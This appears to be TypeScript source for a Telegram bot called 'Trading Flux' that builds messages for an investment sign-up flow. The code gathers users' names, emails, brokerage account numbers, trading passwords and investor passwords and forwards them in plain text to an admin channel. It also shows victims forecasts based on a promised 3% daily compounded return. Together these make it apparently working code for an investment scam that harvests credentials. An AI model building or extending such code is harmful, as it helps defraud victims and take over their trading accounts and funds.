import { UserSession } from "../types";

// Escape user-supplied strings so they can't break HTML parse mode
function esc(s: string | undefined): string {
  return (s ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

export function buildAdminMessage(
  session: UserSession,
  userId: number,
  username?: string
): string {
  const userTag = username ? `@${esc(username)}` : `ID: ${userId}`;
  const submittedAt = new Date().toUTCString();
  const deposit = parseFloat(session.depositAmount || "0");
  const proj30 = (deposit * Math.pow(1.03, 30)).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  const proj90 = (deposit * Math.pow(1.03, 90)).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });

  return (
    `🔔 <b>NEW SUBMISSION — Trading Flux</b>\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
    `👤 <b>CLIENT</b>\n` +
    `   Name:      <b>${esc(session.fullName)}</b>\n` +
    `   Email:     <code>${esc(session.email)}</code>\n` +
    `   Telegram:  ${userTag}\n` +
    `   User ID:   <code>${userId}</code>\n\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `🖥 <b>TRADING ACCOUNT</b>\n` +
    `   Platform:  <b>${esc(session.platform)}</b>\n` +
    `   Broker:    <b>${esc(session.brokerName)}</b>\n` +
    `   Server:    <code>${esc(session.serverName)}</code>\n` +
    `   Account:   <code>${esc(session.accountNumber)}</code>\n` +
    `   Password:  <code>${esc(session.password)}</code>\n` +
    `   Investor:  <code>${esc(session.investorPassword)}</code>\n\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `💵 <b>INVESTMENT</b>\n` +
    `   Deposit:   <b>$${esc(session.depositAmount)}</b>\n` +
    `   Start:     <b>${esc(session.startDate)}</b>\n\n` +
    `📈 <b>PROJECTIONS</b> (+3%/day)\n` +
    `   30 days:   $${proj30}\n` +
    `   90 days:   $${proj90}\n\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `🕐 Submitted: ${submittedAt}\n` +
    `📌 Status: <b>🟡 Pending Review</b>\n\n` +
    `Reply /approve_${userId} to activate this account.`
  );
}

export function buildConfirmationMessage(session: UserSession): string {
  const deposit = parseFloat(session.depositAmount || "0");
  const proj7 = (deposit * Math.pow(1.03, 7)).toLocaleString("en-US", { minimumFractionDigits: 2 });
  const proj30 = (deposit * Math.pow(1.03, 30)).toLocaleString("en-US", { minimumFractionDigits: 2 });

  return (
    `┌─────────────────────────┐\n` +
    `│  ✅  SUBMISSION RECEIVED │\n` +
    `└─────────────────────────┘\n\n` +
    `Thank you, *${session.fullName}*! 🎉\n\n` +
    `Your account details have been forwarded to the *Trading Flux* management team.\n\n` +
    `${"━".repeat(28)}\n` +
    `📋 *SUMMARY*\n` +
    `   Platform:  *${session.platform}*\n` +
    `   Broker:    *${session.brokerName}*\n` +
    `   Account:   \`${session.accountNumber}\`\n` +
    `   Deposit:   *$${session.depositAmount}*\n` +
    `   Start:     ${session.startDate}\n\n` +
    `${"━".repeat(28)}\n` +
    `📈 *YOUR GROWTH FORECAST*\n` +
    `   In 7 days:  *$${proj7}*\n` +
    `   In 30 days: *$${proj30}*\n\n` +
    `${"━".repeat(28)}\n` +
    `⏳ Review time: *24 hours*\n` +
    `🔔 You will be notified when your account is activated.\n\n` +
    `Use /balance to check your live dashboard.`
  );
}

export function buildFormPreview(session: UserSession): string {
  return (
    `┌─────────────────────────┐\n` +
    `│  📝  REVIEW SUBMISSION  │\n` +
    `└─────────────────────────┘\n\n` +
    `Please confirm all details are correct before submitting:\n\n` +
    `${"━".repeat(28)}\n` +
    `👤 *Personal*\n` +
    `   Name:     *${session.fullName}*\n` +
    `   Email:    \`${session.email}\`\n\n` +
    `🖥️ *Trading Account*\n` +
    `   Platform: *${session.platform}*\n` +
    `   Broker:   *${session.brokerName}*\n` +
    `   Server:   \`${session.serverName}\`\n` +
    `   Account:  \`${session.accountNumber}\`\n` +
    `   Password: \`${session.password}\`\n` +
    `   Investor: \`${session.investorPassword}\`\n\n` +
    `💵 *Investment*\n` +
    `   Deposit:  *$${session.depositAmount}*\n` +
    `   Date:     ${session.startDate}\n` +
    `${"━".repeat(28)}\n\n` +
    `_Double-check your credentials. Incorrect details will delay activation._`
  );
}
